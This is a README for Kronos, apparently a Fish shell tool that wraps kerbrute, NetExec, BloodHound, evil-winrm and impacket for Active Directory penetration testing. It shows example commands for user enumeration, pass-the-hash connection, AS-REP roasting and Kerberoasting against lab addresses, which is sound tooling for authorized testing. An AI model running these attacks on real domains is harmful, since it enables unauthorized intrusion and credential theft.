# Kronos Active Directory Attack Orchestrator

Kronos is a Fish shell-based orchestration tool designed to simplify and automate common Active Directory penetration testing tasks. It acts as a wrapper around powerful underlying utilities such as `kerbrute`, `rpcclient`, `nxc` (NetExec), and `bloodhound-python`.

## Dependency & Acknowledgement

**Important:** Kronos is built to seamlessly integrate with **[tgt](https://github.com/fuxx/tgt)**. `tgt` is a Fish shell framework that manages context for penetration testing (targets, credentials, workspaces, scenarios). 

Kronos leverages `tgt`'s exported global variables (`$TGT`, `$TGT_DC`, `$TGT_AD_DOMAIN`, `$TGT_USERNAME`, `$TGT_PASSWORD`) to automatically target the correct machines and use the active credentials without requiring you to pass them manually via command-line flags. **For Kronos to work efficiently, it must be used alongside `tgt`.**

## Installation

1. **Clone the repository:**
   ```bash
   git clone <repository_url> Kronos-Active-Directory-attack-orchestrator
   cd Kronos-Active-Directory-attack-orchestrator
   ```

2. **Install external dependencies (like kerbrute):**
   ```bash
   make install
   ```
   *(Ensure that `go` is installed and your `~/go/bin` is in your `$PATH`.)*

3. **Install Fish Functions (Autoloading):**
   Symlink the Kronos and tgt functions to your Fish configuration directory so they are automatically loaded:
   ```bash
   mkdir -p ~/.config/fish/functions
   ln -sf /path/to/Kronos-Active-Directory-attack-orchestrator/functions/*.fish ~/.config/fish/functions/
   ln -sf /path/to/pentest-fish-functions/functions/*.fish ~/.config/fish/functions/
   ```

## Usage

You can invoke the main help menu by running:
```bash
kronos help
```

### Commands

*   **`userenum`**: Run `kerbrute` user enumeration against the target domain.
    ```bash
    kronos userenum 10.10.10.10 -w /path/to/wordlist.txt
    ```

*   **`dominfo`**: Query domain info and password policy using `rpcclient` (Null Session) or `nxc` (Credentialed).
    ```bash
    kronos dominfo 10.10.10.10 --pass-policy
    # Force a null session even if tgt credentials are active
    kronos dominfo 10.10.10.10 -N
    ```

*   **`ingest`**: Run `bloodhound-python` to gather Active Directory information and zip it.
    ```bash
    kronos ingest 10.10.10.10
    # Overriding default tgt credentials
    kronos ingest 10.10.10.10 -u 'admin' -p 'Secret123!' -o 'my-collection.zip'
    ```

*   **`connect`**: Connect to the target using `evil-winrm` (CLI) or `xfreerdp3` (GUI).
    ```bash
    # CLI connection (uses evil-winrm with active tgt credentials)
    kronos connect 10.10.10.10

    # GUI connection (uses xfreerdp3 with active tgt credentials)
    kronos connect 10.10.10.10 --gui
    
    # Overriding credentials and using a hash
    kronos connect 10.10.10.10 -u 'admin' -H 'aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76'
    ```

*   **`asrep-roast`**: Perform AS-REP roasting against a specific user using `impacket-GetNPUsers`.
    ```bash
    # Uses active tgt username and domain by default
    kronos asrep-roast 10.10.10.10
    
    # Overriding the target username explicitly
    kronos asrep-roast 10.10.10.10 -u 't.baker'
    ```

*   **`kerbroast`**: Perform Kerberoasting against the domain using `impacket-GetUserSPNs`.
    ```bash
    # Roast all users (uses active tgt credentials to authenticate)
    kronos kerbroast 10.10.10.10
    
    # Roast a specific user only
    kronos kerbroast 10.10.10.10 -t 't.baker'
    
    # Overriding the authentication credentials
    kronos kerbroast 10.10.10.10 -u 'admin' -p 'Secret123!'
    ```

*(Run `kronos <command> --help` for specific options available to each command.)*
